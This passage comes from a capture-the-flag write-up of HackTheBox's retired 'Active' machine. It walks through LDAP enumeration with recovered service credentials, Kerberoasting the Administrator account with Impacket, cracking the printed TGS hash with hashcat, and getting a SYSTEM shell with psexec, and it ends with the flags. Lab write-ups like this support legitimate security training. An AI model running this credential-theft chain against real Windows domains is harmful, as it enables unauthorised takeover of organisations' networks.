10.10.10.100 445 DC [*] Enumerated shares SMB 10.10.10.100 445 DC Share Permissions Remark SMB 10.10.10.100 445 DC ----- ----------- ------ SMB 10.10.10.100 445 DC ADMIN$ Remote Admin SMB 10.10.10.100 445 DC C$ Default share SMB 10.10.10.100 445 DC IPC$ Remote IPC SMB 10.10.10.100 445 DC NETLOGON READ Logon server share SMB 10.10.10.100 445 DC Replication READ SMB 10.10.10.100 445 DC SYSVOL READ Logon server share SMB 10.10.10.100 445 DC Users READ We now have read access to the Users share. We can navigate to SVC_TGS\u0026rsquo;s Desktop and get user.txt file.\nRoot Flag # Enumeration # Use the credentials to query and enumerate the LDAP with ldapsearch. Find non-disabled accounts / active accounts by setting the LDAP filter.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows/active.htb] └─$ ldapsearch -x -H \u0026#39;ldap://10.10.10.100\u0026#39; -D \u0026#39;SVC_TGS\u0026#39; -w \u0026#39;GPPstillStandingStrong2k18\u0026#39; -b \u0026#34;dc=active,dc=htb\u0026#34; -s sub \u0026#39;(\u0026amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))\u0026#39; samaccountname | grep sAMAccountName sAMAccountName: Administrator sAMAccountName: SVC_TGS We can also enumerate domain user accounts with Impacket\u0026rsquo;s GetADUsers.py.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows/active.htb] └─$ GetADUsers.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -all Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Querying 10.10.10.100 for information about domain. Name Email PasswordLastSet LastLogon -------------------- ------------------------------ ------------------- ------------------- Administrator 2018-07-19 02:06:40.351723 2024-11-17 16:38:26.644567 Guest \u0026lt;never\u0026gt; \u0026lt;never\u0026gt; krbtgt 2018-07-19 01:50:36.972031 \u0026lt;never\u0026gt; SVC_TGS 2018-07-19 03:14:38.402764 2024-11-17 19:34:40.514739 Check for accounts with registered SPN, because those accounts are vulnerable to Kerberoasting. Use GetUserSPNs.py from Impacket.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS Impacket v0.12.0.dev1 - Copyright 2023 Fortra Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-19 02:06:40.351723 2024-11-17 16:38:26.644567 Found that the Administrator account is vulnerable to Kerberoasting. Why is it vulnerable? Because Kerberos uses SPN to identify account associated with a particular service instance, which means we can request a TGS for a service account and have the TGS encrypted with it\u0026rsquo;s NTLM hash, which can be cracked locally.\nKerberoasting # Request a TGS and extract hash for Administrator.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request-user Administrator Impacket v0.12.0.dev1 - Copyright 2023 Fortra Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-19 02:06:40.351723 2024-11-17 16:38:26.644567 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$08ba3370b7272dfc2f9e4e420ea2d0be$c93c7ccf8597854a16804184264c716d9ae63f31e96197858ced64b64976178a5b0ff509514dfc29c37ccfbbc14729e4d660f35574692c736710c0f265d4863ada71d5aaf82d23892e1a1e32332330b2ef1e6f7a2af7d3df3346bf91bb08050b293f874687f8aa91929e3d5dd62bdb0e5e5cf2d472fdd4489310699315f4e0cfe04f8ab109a7a06027b92233644850c3c1d824bf8862353e83f700c07a6db50c8596211df82cc893812752bab8467567c11acce8d75cf9a96fd6d45e4571a2c36a5eebb3d0f2a6af88be3e5d48e039d400f7c5535bc9750defeceda01ceb521028eb46ef31e6c2dc15511518eeec2b8b5825fb917b8ab1355f34958e45806a9c2404c2e48a1f030e5c6bd4e431f38b202b529ddc6344e22840323c30e05558d9b95d1f0bf2265b5ca0f9896372f5cb4e83dce31726317d46c4e3c00f48aefb7d8a5c400d35c232c97e43c58842f37ab1f08ccce57166b5d23c6ff13da1188e42ac44f32be7cb7c6f7cab7e66a5acde469ab7ed3d48247320212e1ce87ad77f0acc93426cf7ae5eb877af95d3739554f6d77f5d8c064810c3efb7d2bbb262caa889b70e7fd6d6c6013e18afdeac0ca804668cf68514f2b7f25ac808ad0400b641d3c30fc7627d61afb0731b508d8076b6e63a9a18ebb1815245359651922d7a849ba2ae76016775b4faf8fcc54c741544611c608f1ba6854fdd81793af7dec0052d3faca036edcd60f7b2ca2e69724958c21b53f17ba3a3e40f30af0a41ff47109e8681f8518f9d164aa35d6c36fde15dff9bf6ab111cee49af633baea5bfe61326303af591d5e9e5ea787bef5e120f87d49d56db0c09d5df2da35b83efade7276f6e0f397e9b047edbbda0cffe028a9096d5ec7a260564f746e0164c7989dae627177679c52aded1a5b95b85c22055ffd686ad64f292319a85fa33762145c6cd878787b2e66892fd91cf265e576fa8d231d5dd0b99acdf5b087f42aa370a0f64194f3564ba5071e47a6aa52b0b2315e0cd861156f0ca2e28ef528b22c0fca7de4467ac0868212302302e0dcf9c2d23a2384223811a19c3cf3d5fdfbdd105631068ac46fbd6446499b7d2719a5b8a4683fa3533b712151cfd3a366b88dedf50fd2dd26fad4cbbc77c84e6e6628f5d593af196d3927fb93b2ddec780ff37354d3387122c3bc5acdc47f7d204451f1de66194b1c71049c958e1558bbc60c748e48ad9f54583fc100a2f2d1529c0d014d56032c7a37a3e13313e5283 Obtained Administrator\u0026rsquo;s hash. Crack the hash with hashcat.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ cat administrator.kerb | haiti - Kerberos 5 TGS-REP etype 23 [HC: 13100] [JtR: krb5tgs] ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ hashcat -m 13100 administrator.kerb ~/Arsenal/wordlists/rockyou.txt $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$08ba3370b7272dfc2f9e4e420ea2d0be$c93c7ccf8597854a16804184264c716d9ae63f31e96197858ced64b64976178a5b0ff509514dfc29c37ccfbbc14729e4d660f35574692c736710c0f265d4863ada71d5aaf82d23892e1a1e32332330b2ef1e6f7a2af7d3df3346bf91bb08050b293f874687f8aa91929e3d5dd62bdb0e5e5cf2d472fdd4489310699315f4e0cfe04f8ab109a7a06027b92233644850c3c1d824bf8862353e83f700c07a6db50c8596211df82cc893812752bab8467567c11acce8d75cf9a96fd6d45e4571a2c36a5eebb3d0f2a6af88be3e5d48e039d400f7c5535bc9750defeceda01ceb521028eb46ef31e6c2dc15511518eeec2b8b5825fb917b8ab1355f34958e45806a9c2404c2e48a1f030e5c6bd4e431f38b202b529ddc6344e22840323c30e05558d9b95d1f0bf2265b5ca0f9896372f5cb4e83dce31726317d46c4e3c00f48aefb7d8a5c400d35c232c97e43c58842f37ab1f08ccce57166b5d23c6ff13da1188e42ac44f32be7cb7c6f7cab7e66a5acde469ab7ed3d48247320212e1ce87ad77f0acc93426cf7ae5eb877af95d3739554f6d77f5d8c064810c3efb7d2bbb262caa889b70e7fd6d6c6013e18afdeac0ca804668cf68514f2b7f25ac808ad0400b641d3c30fc7627d61afb0731b508d8076b6e63a9a18ebb1815245359651922d7a849ba2ae76016775b4faf8fcc54c741544611c608f1ba6854fdd81793af7dec0052d3faca036edcd60f7b2ca2e69724958c21b53f17ba3a3e40f30af0a41ff47109e8681f8518f9d164aa35d6c36fde15dff9bf6ab111cee49af633baea5bfe61326303af591d5e9e5ea787bef5e120f87d49d56db0c09d5df2da35b83efade7276f6e0f397e9b047edbbda0cffe028a9096d5ec7a260564f746e0164c7989dae627177679c52aded1a5b95b85c22055ffd686ad64f292319a85fa33762145c6cd878787b2e66892fd91cf265e576fa8d231d5dd0b99acdf5b087f42aa370a0f64194f3564ba5071e47a6aa52b0b2315e0cd861156f0ca2e28ef528b22c0fca7de4467ac0868212302302e0dcf9c2d23a2384223811a19c3cf3d5fdfbdd105631068ac46fbd6446499b7d2719a5b8a4683fa3533b712151cfd3a366b88dedf50fd2dd26fad4cbbc77c84e6e6628f5d593af196d3927fb93b2ddec780ff37354d3387122c3bc5acdc47f7d204451f1de66194b1c71049c958e1558bbc60c748e48ad9f54583fc100a2f2d1529c0d014d56032c7a37a3e13313e5283:Ticketmaster1968 Obtained Administrator\u0026rsquo;s password: Administrator:Ticketmaster1968\nRetrieving root flag # ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ netexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968 SMB 10.10.10.100 445 DC [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\Administrator:Ticketmaster1968 (Pwn3d!) ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file UNfiOQwm.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service jfDE on 10.10.10.100..... [*] Starting service jfDE..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; cd c:\\Users\\Administrator\\Desktop c:\\Users\\Administrator\\Desktop\u0026gt; type root.txt 1353440b190e78a45b39f4bdab2bb212 Result # Flags # user: 34f1dfdc78315bb004ba1d6da7e9bc41 root: 1353440b190e78a45b39f4bdab2bb212 ","date":"17 November 2024","externalUrl":null,"permalink":"/htb/active-easy/","section":"HTB Writeups","summary":"Writeup for Active, an easy difficulty Windows machine from HackTheBox.","title":"HTB - Active","type":"htb"},{"content":" Contains writeups for retired HTB machines with explanation and scripts. ","date":"17 November 2024","externalUrl":null,"permalink":"/htb/","section":"HTB Writeups","summary":"Contains writeups for retired HTB machines with explanation and scripts.","title":"HTB Writeups","type":"htb"},{"content":"Tags collection if you are looking for a specific topic.\n","date":"17 November 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"Tags collection if you are looking for a specific topic.","title":"Tags","type":"tags"},{"content":"","date":"17 November 2024","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]